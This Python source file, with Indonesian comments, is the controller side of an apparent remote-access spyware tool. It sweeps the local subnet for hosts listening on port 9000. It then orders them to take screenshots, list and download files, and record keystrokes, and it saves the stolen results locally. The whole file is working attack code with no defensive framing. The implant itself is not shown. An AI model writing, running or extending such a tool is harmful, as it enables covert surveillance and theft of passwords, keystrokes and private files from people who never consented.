import socket
import threading
from datetime import datetime
import ipaddress

def generate_unique_filename(base_name, file_extension):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    return f"{base_name}_{timestamp}.{file_extension}"

def send_command(command, server_ip, server_port=9000):
    # Membuat socket baru untuk setiap perintah
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))
    
    try:
        # Mengirim perintah ke server
        client_socket.sendall(command.encode())
        
        # Menerima panjang data yang akan diterima (4 byte pertama)
        data_length = int.from_bytes(client_socket.recv(4), 'big')
        
        # Menerima data berdasarkan panjang data yang diterima
        received_data = b""
        while len(received_data) < data_length:
            packet = client_socket.recv(4096)
            if not packet:
                break
            received_data += packet
        
        # Menampilkan respons
        if command == "start_keystroke" or command == "stop_keystroke":
            response = received_data.decode()
            print(response)
            
        if command == "stop_keystroke":
            # Menyimpan log ke file di sisi klien
            filename = generate_unique_filename("keystrokes", "txt")
            with open(filename, "w") as file:
                file.write(received_data.decode())
            print(f"Keystrokes saved to {filename}")
        else:
            if command == "screenshot":
                filename = generate_unique_filename("screenshot", "jpg")
                with open(filename, "wb") as file:
                    file.write(received_data)
                print(f"Screenshot saved as {filename}")
            elif command == "list_files":
                print("Files in server directory:")
                print(received_data.decode())
            elif command.startswith("get_file"):
                filename = command.split(" ")[1]
                with open(filename, "wb") as file:
                    file.write(received_data)
                print(f"File '{filename}' downloaded successfully.")
    
    finally:
        client_socket.close()

def get_local_ip():
    # Mengambil IP lokal dengan mencoba koneksi ke server eksternal
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(('10.254.254.254', 1))  # Hanya untuk mendapatkan IP lokal
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = '127.0.0.1'
    finally:
        s.close()
    return local_ip

def scan_for_servers(start_ip, end_ip, port=9000):
    open_servers = []
    for i in range(int(start_ip.split('.')[-1]), int(end_ip.split('.')[-1]) + 1):
        ip = ".".join(start_ip.split('.')[:-1]) + f'.{i}'
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))  # Try to connect to the port
            if result == 0:  # If successful, port is open
                open_servers.append(ip)
            sock.close()
        except socket.error:
            continue
    return open_servers

def choose_server():
    while True:
        print("\nScanning for servers with port 9000 open...")
        
        # Mendapatkan IP lokal perangkat
        local_ip = get_local_ip()
        print(f"Local IP address: {local_ip}")
        
        # Menghitung rentang IP berdasarkan IP lokal
        network = ipaddress.ip_network(f"{local_ip}/24", strict=False)
        
        # Menggunakan alamat network untuk memindai IP yang tersedia
        open_servers = scan_for_servers(str(network.network_address), str(network.broadcast_address))
        
        if open_servers:
            print("Servers with port 9000 open:")
            for idx, server in enumerate(open_servers, start=1):
                print(f"{idx}. {server}")
            
            print(f"{len(open_servers) + 1}. Rescan IPs")
            print(f"{len(open_servers) + 2}. Exit")
            
            choice = int(input(f"Select an option (1-{len(open_servers) + 2}): "))
            if choice <= len(open_servers):
                return open_servers[choice - 1]  # Mengembalikan IP yang dipilih
            elif choice == len(open_servers) + 1:
                continue  # Melakukan rescan
            elif choice == len(open_servers) + 2:
                return None
        else:
            print("No servers found with port 9000 open.")
            retry = input("Do you want to rescan? (yes/no): ").strip().lower()
            if retry == 'no':
                return None

def handle_command_in_thread(command, server_ip):
    command_thread = threading.Thread(target=send_command, args=(command, server_ip))
    command_thread.start()

def main():
    while True:
        server_ip = choose_server()
        if server_ip:
            while True:
                print("\nCommands:")
                print("1. screenshot - Capture a screenshot from the server")
                print("2. list_files - List files in the server's current directory")
                print("3. get_file <filename> - Download a specific file from the server")
                print("4. start_keystroke - Start recording keystrokes on the server")
                print("5. stop_keystroke - Stop recording keystrokes and retrieve log")
                print("6. back - Return to server selection")
                
                command = input("Enter command: ").strip()
                
                if command == "back":
                    break
                else:
                    handle_command_in_thread(command, server_ip)
        else:
            print("Exiting client...")
            break

if __name__ == "__main__":
    main()
